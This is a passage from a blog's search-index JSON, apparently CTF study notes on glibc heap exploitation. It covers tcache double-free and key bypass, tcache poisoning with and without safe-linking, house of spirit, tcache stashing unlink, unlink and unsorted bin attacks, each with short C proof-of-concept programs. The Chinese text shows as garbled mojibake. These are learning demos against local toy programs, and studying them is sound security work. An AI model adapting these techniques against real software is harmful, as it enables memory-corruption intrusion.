size_t tc_idx = csize2tidx (size); if (tcache != NULL \u0026amp;\u0026amp; tc_idx \u0026lt; mp_.tcache_bins) { /* Check to see if it\u0026#39;s already in the tcache. */ tcache_entry *e = (tcache_entry *) chunk2mem (p); /* This test succeeds on double free. However, we don\u0026#39;t 100% trust it (it also matches random payload data at a 1 in 2^\u0026lt;size_t\u0026gt; chance), so verify it\u0026#39;s not an unlikely coincidence before aborting. */ if (__glibc_unlikely (e-\u0026gt;key == tcache_key)) { tcache_entry *tmp; size_t cnt = 0; LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-\u0026gt;entries[tc_idx]; tmp; tmp = REVEAL_PTR (tmp-\u0026gt;next), ++cnt) { if (cnt \u0026gt;= mp_.tcache_count) malloc_printerr (\u0026#34;free(): too many chunks detected in tcache\u0026#34;); if (__glibc_unlikely (!aligned_OK (tmp))) malloc_printerr (\u0026#34;free(): unaligned chunk detected in tcache 2\u0026#34;); if (tmp == e) malloc_printerr (\u0026#34;free(): double free detected in tcache 2\u0026#34;); /* If we get here, it was a coincidence. We\u0026#39;ve wasted a few cycles, but don\u0026#39;t abort. */ } } ... ... } tcache binç»“æ„\nchunk-\u0026gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r| previous size |\r+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r| Size |A|M|P|\t|\r+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r| fd |\r+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\r| key |\r+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ åªéœ€è¦æ›´æ”¹keyçš„å€¼å³å¯ã€‚\nç¨‹åºæ¼”ç¤ºï¼š\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; int main() { int64_t *ptr=malloc(0x40); free(ptr); ptr[1]=12345; free(ptr); printf(\u0026#34;%p\\n\u0026#34;,malloc(0x40)); printf(\u0026#34;%p\\n\u0026#34;,malloc(0x40)); return 0; } Tcache-poisoning #\rglibc 2.31åŠç‰ˆæœ¬ä»¥ä¸‹åˆ©ç”¨ #\rç›´æ¥ä¼ªé€ next ï¼Œæ³¨æ„ä¼ªé€ åœ°å€çš„å¯¹é½ã€‚\nç¨‹åºæ¼”ç¤ºï¼š\n#include \u0026lt;stdio.h\u0026gt;s #include \u0026lt;stdint.h\u0026gt; int main() { int64_t *p1=malloc(0x40); int64_t *p2=malloc(0x40); int64_t stack_addr=\u0026#34;deadbeef\u0026#34;; free(p1); free(p2); p2[0]=\u0026amp;stack_addr; printf(\u0026#34;malloc chunk = %p\\n\u0026#34;,malloc(0x40)); printf(\u0026#34;fake chunk = %p\\n\u0026#34;,malloc(0x40)); return 0; } glibc2.31ä»¥ä¸Šç‰ˆæœ¬åˆ©ç”¨ #\réœ€è¦ä¼ªé€ åŠ å¯†åçš„nextï¼Œæ³¨æ„ä¼ªé€ åœ°å€çš„å¯¹é½ã€‚\nç®—æ³•ï¼š(å½“å‰åœ°å€ \u0026raquo; 12) xor nextçš„åœ°å€\nç¨‹åºæ¼”ç¤ºï¼š\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { size_t stack_var[0x10]; size_t *target = NULL; // choose a properly aligned target address for(int i=0; i\u0026lt;0x10; i++) { if(((long)\u0026amp;stack_var[i] \u0026amp; 0xf) == 0) { target = \u0026amp;stack_var[i]; break; } } assert(target != NULL); printf(\u0026#34;The address we want malloc() to return is %p.\\n\u0026#34;, target); intptr_t *a = malloc(128); intptr_t *b = malloc(128); free(a); free(b); b[0] = (intptr_t)((long)target ^ (long)b \u0026gt;\u0026gt; 12); printf(\u0026#34;1st malloc(128): %p\\n\u0026#34;, malloc(128)); intptr_t *c = malloc(128); printf(\u0026#34;2nd malloc(128): %p\\n\u0026#34;, c); return 0; } decrypt_safe_linking #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; long decrypt(long cipher) { puts(\u0026#34;The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known,\u0026#34;); puts(\u0026#34;because of the 12bit sliding.\u0026#34;); puts(\u0026#34;And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)\u0026#34;); long key = 0; long plain; for(int i=1; i\u0026lt;6; i++) { int bits = 64-12*i; if(bits \u0026lt; 0) bits = 0; plain = ((cipher ^ key) \u0026gt;\u0026gt; bits) \u0026lt;\u0026lt; bits; key = plain \u0026gt;\u0026gt; 12; printf(\u0026#34;round %d:\\n\u0026#34;, i); printf(\u0026#34;key: %#016lx\\n\u0026#34;, key); printf(\u0026#34;plain: %#016lx\\n\u0026#34;, plain); printf(\u0026#34;cipher: %#016lx\\n\\n\u0026#34;, cipher); } return plain; } int main() { setbuf(stdin, NULL); setbuf(stdout, NULL); // step 1: allocate chunks long *a = malloc(0x20); long *b = malloc(0x20); printf(\u0026#34;First, we create chunk a @ %p and chunk b @ %p\\n\u0026#34;, a, b); malloc(0x10); puts(\u0026#34;And then create a padding chunk to prevent consolidation.\u0026#34;); // step 2: free chunks puts(\u0026#34;Now free chunk a and then free chunk b.\u0026#34;); free(a); free(b); printf(\u0026#34;Now the freelist is: [%p -\u0026gt; %p]\\n\u0026#34;, b, a); printf(\u0026#34;Due to safe-linking, the value actually stored at b[0] is: %#lx\\n\u0026#34;, b[0]); // step 3: recover the values puts(\u0026#34;Now decrypt the poisoned value\u0026#34;); long plaintext = decrypt(b[0]); printf(\u0026#34;value: %p\\n\u0026#34;, a); printf(\u0026#34;recovered value: %#lx\\n\u0026#34;, plaintext); assert(plaintext == (long)a); } Tcache house of spirit #\rPOC\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { unsigned long long *a; //pointer that will be overwritten unsigned long long fake_chunks[10]; //fake chunk region malloc(1); fake_chunks[1] = 0x40; // this is the size a = \u0026amp;fake_chunks[2]; free(a); void *b = malloc(0x30); printf(\u0026#34;malloc(0x30): %p\\n\u0026#34;, b); assert((long)b == (long)\u0026amp;fake_chunks[2]); } Tcache stashing unlink attack #\rPOC\n1 //gcc -g -no-pie hollk.c -o hollk 2 //patchelf --set-rpath è·¯å¾„/2.27-3ubuntu1_amd64/ hollk 3 //patchelf --set-interpreter è·¯å¾„/2.27-3ubuntu1_amd64/ld-linux-x86-64.so.2 hollk 4 #include \u0026lt;stdio.h\u0026gt; 5 #include \u0026lt;stdlib.h\u0026gt; 6 #include \u0026lt;assert.h\u0026gt; 7 8 int main(){ 9 unsigned long stack_var[0x10] = {0}; 10 unsigned long *chunk_lis[0x10] = {0}; 11 unsigned long *target; 12 13 setbuf(stdout, NULL); 14 15 printf(\u0026#34;stack_var addr is:%p\\n\u0026#34;,\u0026amp;stack_var[0]); 16 printf(\u0026#34;chunk_lis addr is:%p\\n\u0026#34;,\u0026amp;chunk_lis[0]); 17 printf(\u0026#34;target addr is:%p\\n\u0026#34;,(void*)target); 18 19 stack_var[3] = (unsigned long)(\u0026amp;stack_var[2]); 20 21 for(int i = 0;i \u0026lt; 9;i++){ 22 chunk_lis[i] = (unsigned long*)malloc(0x90); 23 } 24 25 for(int i = 3;i \u0026lt; 9;i++){ 26 free(chunk_lis[i]); 27 } 28 29 free(chunk_lis[1]); 30 free(chunk_lis[0]); 31 free(chunk_lis[2]); 32 33 malloc(0xa0); 34 malloc(0x90); 35 malloc(0x90); 36 37 chunk_lis[2][1] = (unsigned long)stack_var; 38 calloc(1,0x90); 39 40 target = malloc(0x90); 41 42 printf(\u0026#34;target now: %p\\n\u0026#34;,(void*)target); 43 44 assert(target == \u0026amp;stack_var[2]); 45 return 0; 46 } çŸ¥è¯†ç‚¹ï¼š\ncallocåˆ†é…å†…å­˜ callocä¸ä¼šä»fastbinså’Œtcache binä¸­åˆ†é…å†…å­˜ï¼ˆå³ä½¿è¯·æ±‚å¤§å°åŒ¹é…ï¼‰ï¼Œå› ä¸ºfastbinsçš„chunkå¯èƒ½æœªåˆå¹¶ï¼Œæ— æ³•ä¿è¯è¿ç»­ç©ºé—´ã€‚ åˆ†é…æ—¶ä¼˜å…ˆä»smallbins/unsortedbinsæˆ–top chunkåˆ‡å‰²ã€‚ callocä»small bin ä¸­æ‹¿å‡ºä¸€ä¸ªç©ºé—²chunkåï¼Œä¼šå°†å…¶ä½™chunkæ”¾å…¥tcache bin ä¸­ï¼ˆç›´åˆ°å¡«æ»¡ï¼‰ï¼Œå¹¶ä¸”åªä¼šæ£€æµ‹å¯¹ç¬¬ä¸€ä¸ª chunkè¿›è¡Œäº†å®Œæ•´æ€§æ£€æŸ¥ï¼Œåé¢çš„chunkçš„æ£€æŸ¥ç¼ºå¤±ï¼Œå°±é€ æˆäº†fake chunkã€‚ æ”»å‡»æ­¥éª¤ï¼š\nmalloc(0x90)å¤§å°çš„ 9ä¸ªchunk free 7 ä¸ªchunk å¡«æ»¡ tcache bin free 2 ä¸ªchunkï¼ˆchunk0ã€chunk2ï¼‰ æ”¾å…¥unsorted bin malloc(0xa0)å¤§å°çš„chunkï¼Œç”±äºunsorted binå­˜å–æœºåˆ¶çš„åŸå› ï¼Œunsorted binä¸­å¦‚æœæ²¡æœ‰ç¬¦åˆchunk sizeçš„ç©ºé—²å—ï¼ˆchunk0ã€chunk2 sizeå°äº0xb0ï¼‰ï¼Œé‚£ä¹ˆunsorted binä¸­çš„ç©ºé—²å—ä¼šæŒ‰ç…§sizeåˆ†é…åˆ°åœ¨small binæˆ–large binçš„é“¾è¡¨ä¸­ã€‚ chunk0ã€chunk2è¢«æ”¾å…¥ small binä¸­ ä¿®æ”¹ chunk2 ä¸­çš„bkæŒ‡å‘ç›®æ ‡åœ°å€fake_chunk ä½¿ç”¨callocåˆ†é…åœ°å€ï¼Œè§¦å‘callocçš„æœºåˆ¶ï¼Œåˆ†é…chunk0ï¼Œæ£€æµ‹chunk2ï¼Œå¹¶å°†small binä¸­çš„chunkæ”¾å…¥tcacheä¸­ï¼Œç›´åˆ°å¡«æ»¡ã€‚ malloc(0x90) ,å¾—åˆ°fake chunkã€‚ ","externalUrl":null,"permalink":"/posts/pwn/heap/tcache_attack/","section":"æˆ‘çš„åšå®¢","summary":"","title":"","type":"posts"},{"content":"\rUnlink #\runlink æºç  #\rstatic void unlink_chunk (mstate av, mchunkptr p) { if (chunksize (p) != prev_size (next_chunk (p))) malloc_printerr (\u0026#34;corrupted size vs. prev_size\u0026#34;); mchunkptr fd = p-\u0026gt;fd; mchunkptr bk = p-\u0026gt;bk; if (__builtin_expect (fd-\u0026gt;bk != p || bk-\u0026gt;fd != p, 0)) malloc_printerr (\u0026#34;corrupted double-linked list\u0026#34;); fd-\u0026gt;bk = bk; bk-\u0026gt;fd = fd; if (!in_smallbin_range (chunksize_nomask (p)) \u0026amp;\u0026amp; p-\u0026gt;fd_nextsize != NULL) { if (p-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize != p || p-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize != p) malloc_printerr (\u0026#34;corrupted double-linked list (not small)\u0026#34;); if (fd-\u0026gt;fd_nextsize == NULL) { if (p-\u0026gt;fd_nextsize == p) fd-\u0026gt;fd_nextsize = fd-\u0026gt;bk_nextsize = fd; else { fd-\u0026gt;fd_nextsize = p-\u0026gt;fd_nextsize; fd-\u0026gt;bk_nextsize = p-\u0026gt;bk_nextsize; p-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize = fd; p-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = fd; } } else { p-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize = p-\u0026gt;bk_nextsize; p-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = p-\u0026gt;fd_nextsize; } } } unlinkæ£€æµ‹æœºåˆ¶ #\r// ç”±äº P å·²ç»åœ¨åŒå‘é“¾è¡¨ä¸­ï¼Œæ‰€ä»¥æœ‰ä¸¤ä¸ªåœ°æ–¹è®°å½•å…¶å¤§å°ï¼Œæ‰€ä»¥æ£€æŸ¥ä¸€ä¸‹å…¶å¤§å°æ˜¯å¦ä¸€è‡´(sizeæ£€æŸ¥) if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (\u0026#34;corrupted size vs. prev_size\u0026#34;); \\ // æ£€æŸ¥ fd å’Œ bk æŒ‡é’ˆ(åŒå‘é“¾è¡¨å®Œæ•´æ€§æ£€æŸ¥) if (__builtin_expect (FD-\u0026gt;bk != P || BK-\u0026gt;fd != P, 0)) \\ malloc_printerr (check_action, \u0026#34;corrupted double-linked list\u0026#34;, P, AV); \\ // largebin ä¸­ next_size åŒå‘é“¾è¡¨å®Œæ•´æ€§æ£€æŸ¥ if (__builtin_expect (P-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize != P, 0) \\ || __builtin_expect (P-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize != P, 0)) \\ malloc_printerr (check_action, \\ \u0026#34;corrupted double-linked list (not small)\u0026#34;, \\ P, AV); unlink æ”»å‡» #\rç°åœ¨æœ‰ä¸¤ä¸ªç‰©ç†ç›¸é‚»çš„ chunk åˆ†åˆ«æ˜¯ Q å’Œ P\nåœ¨Q ä¸­æ„é€  fake chunk ï¼Œç»•è¿‡æ£€æµ‹éœ€è¦æ„é€ FDå’ŒBK å¦‚ï¼š FD = \u0026amp;P - 0x18 ï¼ŒBK = \u0026amp;P - 0x10\nå†ä¼ªé€ Pçš„prev_size ä¸º fake chunk çš„å¤§å°ï¼Œå¹¶å°†å…¶ prev_inuse ä½æ¸…ç©ºã€‚\nfree P è§¦å‘ unlinkï¼Œ\næœ€åä¼šå‘ \u0026amp;P ä¸­ å¡«å…¥ \u0026amp;P - 0x18çš„åœ°å€ã€‚\nç»•è¿‡æ£€æµ‹ #\rç»•è¿‡if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) 1.ä¼ªé€ çš„ fakechunkçš„ next chunkçš„prev_size ä¸º fake chunk çš„å¤§å°ï¼Œå¹¶å°†å…¶ prev_inuse ä½æ¸…ç©º\nç»•è¿‡if (__builtin_expect (FD-\u0026gt;bk != P || BK-\u0026gt;fd != P, 0)) æˆ‘ä»¬éœ€è¦ä¸€ä¸ªfake_chunkã€‚ åˆ¶é€  FD -\u0026gt; bk å’Œ BK -\u0026gt; fd ä¸º Pçš„åœ°å€ã€‚ å› æ­¤ FD å’Œ BK å¯ä»¥æ‰¾å­˜æ”¾PæŒ‡é’ˆçš„å†…å­˜ç©ºé—´å°±æ˜¯ \u0026amp;Pã€‚ FD = \u0026amp;P - 0x18 ï¼ŒBK = \u0026amp;P - 0x10ã€‚ ","externalUrl":null,"permalink":"/posts/pwn/heap/unlink/","section":"æˆ‘çš„åšå®¢","summary":"","title":"","type":"posts"},{"content":"\rUnsorted_bin_attack #\rLink main_arena #\rmalloc chunk1ï¼Œchunk2\nfree chunk1\né€šè¿‡UAFæ‰“å°chunk1ä¸­FDçš„å€¼ï¼Œå°±æ˜¯main_arena + 96 çš„åœ°å€ã€‚\nmain_arena_offset è®¡ç®—ã€‚libc2\nmain_arena_offset = ELF(\u0026#34;libc.so.6\u0026#34;).symbols[\u0026#34;__malloc_hook\u0026#34;] + 0x10 Glibc 2.27 unsorted bin attack #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main(){ volatile unsigned long stack_var=0; unsigned long *p=malloc(0x410); malloc(500); free(p); p[1]=(unsigned long)(\u0026amp;stack_var-2); malloc(0x410); fprintf(stderr, \u0026#34;%p: %p\\n\u0026#34;, \u0026amp;stack_var, (void*)stack_var); assert(stack_var != 0); } ","externalUrl":null,"permalink":"/posts/pwn/heap/unsorted_bin_attack/","section":"æˆ‘çš„åšå®¢","summary":"","title":"","type":"posts"},{"content":"","externalUrl":null,"permalink":"/en/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/en/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/en/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/en/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","externalUrl":null,"permalink":"/en/","section":"Tea","summary":"","title":"Tea","type":"page"}]